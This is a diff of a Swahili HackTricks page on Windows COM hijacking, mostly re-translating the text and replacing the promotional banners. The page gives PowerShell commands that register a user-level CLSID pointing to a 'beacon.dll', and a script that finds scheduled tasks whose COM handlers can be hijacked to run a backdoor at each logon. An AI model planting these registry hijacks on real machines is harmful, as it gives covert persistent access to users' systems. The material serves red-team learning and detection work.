@@ -1,71 +1,70 @@
 # COM Hijacking
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-### Kutafuta vipengele vya COM visivyokuwepo
+### Kutafuta sehemu za COM zisizopo
 
-Kwa kuwa thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **njia ya kudumu**. Kwa kutumia `procmon`, ni rahisi kupata usajili wa COM uliotafutwa ambao haupo ambao mshambuliaji anaweza kuunda ili kudumu. Vichujio:
+Kwa kuwa thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **mekanismu ya kudumu**. Kwa kutumia `procmon` ni rahisi kupata rejista za COM zilizotafutwa ambazo hazipo ambazo mshambuliaji anaweza kuunda ili kudumu. Filters:
 
-* Operesheni za **RegOpenKey**.
-* ambapo _Matokeo_ ni **JINA HALIJAPATIKANA**.
-* na _Njia_ inamalizika na **InprocServer32**.
+* **RegOpenKey** operations.
+* ambapo _Result_ ni **NAME NOT FOUND**.
+* na _Path_ inamalizika na **InprocServer32**.
 
-Baada ya kuamua ni COM ipi isiyokuwepo ya kuiga, tekeleza amri zifuatazo. _Jihadhari ikiwa utaamua kuiga COM ambayo inapakia kila sekunde chache kwani hiyo inaweza kuwa ni mzigo mkubwa._&#x20;
+Mara tu unapokuwa umekamua ni COM ipi isiyopo unayotaka kuiga, tekeleza amri zifuatazo. _Kuwa makini ikiwa unataka kuiga COM inayopakiwa kila sekunde chache kwani hiyo inaweza kuwa kupita kiasi._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-### Vipengele vya COM vya Task Scheduler vinavyoweza kutekwa
+### Hijackable Task Scheduler COM components
 
-Kazi za Windows hutumia Vichocheo Maalum kuwaita vitu vya COM na kwa sababu zinaendeshwa kupitia Task Scheduler, ni rahisi kutabiri wakati zitakapofanyika.
+Windows Tasks hutumia Custom Triggers kuita COM objects na kwa sababu zinafanywa kupitia Task Scheduler, ni rahisi kutabiri wakati zitakapoitwa.
 
-```powershell
-# Onyesha COM CLSIDs
+<pre class="language-powershell"><code class="lang-powershell"># Onyesha COM CLSIDs
 $Tasks = Get-ScheduledTask
 
 foreach ($Task in $Tasks)
 {
-    if ($Task.Actions.ClassId -ne $null)
-    {
-        if ($Task.Triggers.Enabled -eq $true)
-        {
-            $usersSid = "S-1-5-32-545"
-            $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }
+if ($Task.Actions.ClassId -ne $null)
+{
+if ($Task.Triggers.Enabled -eq $true)
+{
+$usersSid = "S-1-5-32-545"
+$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }
 
-            if ($Task.Principal.GroupId -eq $usersGroup)
-            {
-                Write-Host "Task Name: " $Task.TaskName
-                Write-Host "Task Path: " $Task.TaskPath
-                Write-Host "CLSID: " $Task.Actions.ClassId
-                Write-Host
-            }
-        }
-    }
+if ($Task.Principal.GroupId -eq $usersGroup)
+{
+Write-Host "Jina la Kazi: " $Task.TaskName
+Write-Host "Njia ya Kazi: " $Task.TaskPath
+Write-Host "CLSID: " $Task.Actions.ClassId
+Write-Host
+}
+}
+}
 }
 
-# Matokeo ya mfano:
-# Task Name:  Example
-# Task Path:  \Microsoft\Windows\Example\
+# Mfano wa Matokeo:
+<strong># Jina la Kazi:  Mfano
+</strong># Njia ya Kazi:  \Microsoft\Windows\Mfano\
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
-# [zaidi kama hii ya awali...]
-```
+# [zaidi kama ile ya awali...]</code></pre>
 
-Kwa kuangalia matokeo, unaweza kuchagua moja ambayo itatekelezwa **kila wakati mtumiaji anapoingia** kwa mfano.
+Kuangalia matokeo unaweza kuchagua moja ambayo itatekelezwa **kila wakati mtumiaji anapoingia** kwa mfano.
 
-Sasa tafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** na katika HKLM na HKCU, kawaida utagundua kuwa thamani haipo katika HKCU.
+Sasa kutafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** na katika HKLM na HKCU, kwa kawaida utaona kwamba thamani haipo katika HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -86,18 +85,19 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-Kisha, unaweza tu kuunda kuingia kwa HKCU na kila wakati mtumiaji anapoingia, mlango wako wa nyuma utafanya kazi.
+Kisha, unaweza tu kuunda kiingilio cha HKCU na kila wakati mtumiaji anapoingia, nyuma yako itawashwa.
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
